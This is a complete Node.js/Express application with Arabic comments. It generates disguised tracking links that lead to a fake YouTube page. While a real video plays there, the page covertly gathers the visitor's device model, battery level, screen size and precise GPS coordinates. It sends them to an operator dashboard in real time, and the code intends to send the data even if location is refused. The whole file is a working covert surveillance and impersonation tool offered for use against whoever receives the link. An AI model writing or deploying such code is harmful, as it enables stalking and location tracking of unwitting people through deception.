const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());

// 1. الصفحة الرئيسية: لوحة التحكم لإنشاء الروابط ومتابعة المعلومات
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة التحكم - روابط يوتيوب المموهة</title>
        <style>
            body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
            .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
            button { background: #ff0000; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; transition: 0.2s; font-weight: bold; }
            button:hover { background: #cc0000; }
            input { width: 90%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; text-align: center; margin-top: 10px; }
            .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #ff0000; font-size: 14px; line-height: 1.7; }
        </style>
    </head>
    <body>
        <h2>📺 منشئ روابط فيديوهات يوتيوب الذكية</h2>
        <div class="card">
            <p>ضع رابط فيديو يوتيوب أدناه لدمجه وإنشاء رابط تتبع:</p>
            <input type="text" id="ytUrlInput" placeholder="مثال: https://www.youtube.com/watch?v=XXXXXXX" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
            <br><br>
            <button onclick="generateLink()">🔗 إنشاء الرابط المموه</button>
            <div id="linkContainer" style="display:none; margin-top: 15px;">
                <p>الرابط الخاص بك جاهز (أرسله لمن تريد):</p>
                <input type="text" id="linkInput" readonly>
            </div>
        </div>

        <h3>📥 سجل معلومات الأجهزة والمواقع الواردة:</h3>
        <div id="logs" class="card">
            <p style="color: #aaa;">في انتظار فتح أي شخص للرابط...</p>
        </div>

        <script>
            function generateLink() {
                const ytUrl = document.getElementById('ytUrlInput').value;
                const videoIdMatch = ytUrl.match(/(?:v=|youtu\.be\/)([\w-]{11})/);
                const videoId = videoIdMatch ? videoIdMatch[1] : "dQw4w9WgXcQ"; // افتراضي إذا لم يتم إدخال رابط صحيح
                
                const uniqueId = Math.random().toString(36).substring(2, 9);
                const fullUrl = window.location.origin + '/watch/' + uniqueId + '?v=' + videoId;
                
                document.getElementById('linkInput').value = fullUrl;
                document.getElementById('linkContainer').style.display = 'block';
            }

            // استقبال البيانات فورياً عبر Socket.io
            const script = document.createElement('script');
            script.src = "/socket.io/socket.io.js";
            script.onload = () => {
                const socket = io();
                socket.on('new-device-data', (data) => {
                    const logs = document.getElementById('logs');
                    if (logs.innerText.includes('في انتظار فتح')) logs.innerHTML = '';
                    
                    const box = document.createElement('div');
                    box.className = 'info-box';
                    box.innerHTML = \`
                        <strong>🔑 المعرّف:</strong> \${data.linkId}<br>
                        <strong>📱 اسم الهاتف / الجهاز الحقيقي:</strong> \${data.deviceName}<br>
                        <strong>🌐 النظام والمتصفح:</strong> \${data.platform}<br>
                        <strong>🔋 نسبة الشحن:</strong> \${data.battery}<br>
                        <strong>📍 الموقع الجغرافي (الإحداثيات):</strong> \${data.location}<br>
                        <strong>🕒 الوقت:</strong> \${data.time}<br>
                        <strong>🖥️ أبعاد الشاشة:</strong> \${data.screenResolution}
                    \`;
                    logs.prepend(box);
                });
            };
            document.head.appendChild(script);
        </script>
    </body>
    </html>
  `);
});

// 2. صفحة عرض فيديو اليوتيوب الحقيقي (تبدو كأنها يوتيوب تماماً) وفي الخلفية يتم جمع المعلومات
app.get('/watch/:id', (req, res) => {
  const videoId = req.query.v || 'dQw4w9WgXcQ';
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>YouTube</title>
        <style>
            body { font-family: Roboto, Arial, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 0; text-align: center; }
            .header { background: #212121; padding: 12px 20px; text-align: left; font-weight: bold; font-size: 18px; color: #ff0000; border-bottom: 1px solid #333; }
            .container { max-width: 800px; margin: 20px auto; padding: 10px; }
            .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
            .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
            .title { text-align: right; margin-top: 15px; font-size: 18px; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="header">▶ YouTube</div>
        <div class="container">
            <div class="video-container">
                <iframe src="https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
            </div>
            <div class="title">جارِ تشغيل الفيديو...</div>
        </div>

        <script>
            // دالة استخراج اسم الهاتف الحقيقي من UserAgent
            function getDeviceName(ua) {
                if (ua.includes('iPhone')) return 'iPhone (ابل آيفون)';
                if (ua.includes('iPad')) return 'iPad (آيباد)';
                if (ua.includes('Samsung')) return 'Samsung Galaxy (سامسونج)';
                if (ua.includes('Huawei')) return 'Huawei (هواوي)';
                if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) return 'Xiaomi / Redmi (شاومي)';
                if (ua.includes('OPPO')) return 'OPPO';
                if (ua.includes('Realme')) return 'Realme';
                if (ua.includes('Vivo')) return 'Vivo';
                if (ua.includes('Android')) {
                    let match = ua.match(/\\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|Nexus\\s[0-9]+|Pixel\\s[0-9a-zA-Z\\s]+|LM-[A-Z0-9]+)\\b/);
                    return match ? "هاتف اندرويد موديل: " + match[1] : "هاتف Android عام";
                }
                if (ua.includes('Windows')) return 'كمبيوتر مكتبي (Windows)';
                if (ua.includes('Macintosh')) return 'جهاز Mac (ماك)';
                return 'جهاز غير معروف';
            }

            async function collectData() {
                let batteryLevel = "غير مدعوم";
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        batteryLevel = Math.round(b.level * 100) + "% " + (b.charging ? "(⚡ يشحن)" : "(على البطارية)");
                    } catch(e){}
                }

                // محاولة الحصول على الموقع الجغرافي (GPS) بدقة
                let locationStr = "لم يقم المستخدم بالسماح بالموقع أو مرفوض";
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            locationStr = "خط الطول: " + position.coords.latitude + ", خط العرض: " + position.coords.longitude + " (دقة: " + position.coords.accuracy + " متر)";
                            sendToServer(batteryLevel, locationStr);
                        },
                        (error) => {
                            sendToServer(batteryLevel, locationStr); // إرسال البيانات حتى لو رفض إذن الموقع
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                } else {
                    sendToServer(batteryLevel, locationStr);
                }
            }

            function sendToServer(battery, location) {
                const deviceData = {
                    linkId: "${req.params.id}",
                    deviceName: getDeviceName(navigator.userAgent),
                    platform: navigator.platform || "موبايل/متصفح ذكي",
                    battery: battery,
                    location: location,
                    time: new Date().toLocaleTimeString('ar-EG'),
                    screenResolution: window.screen.width + "x" + window.screen.height
                };

                fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceData)
                });
            }

            // تنفيذ الجمع فور دخول الصفحة بينما يعمل فيديو اليوتيوب أمامه
            window.onload = collectData;
        </script>
    </body>
    </html>
  `);
});

// 3. مسار استقبال البيانات وبثها للوحة التحكم
app.post('/api/log', (req, res) => {
  const data = req.body;
  io.emit('new-device-data', data);
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
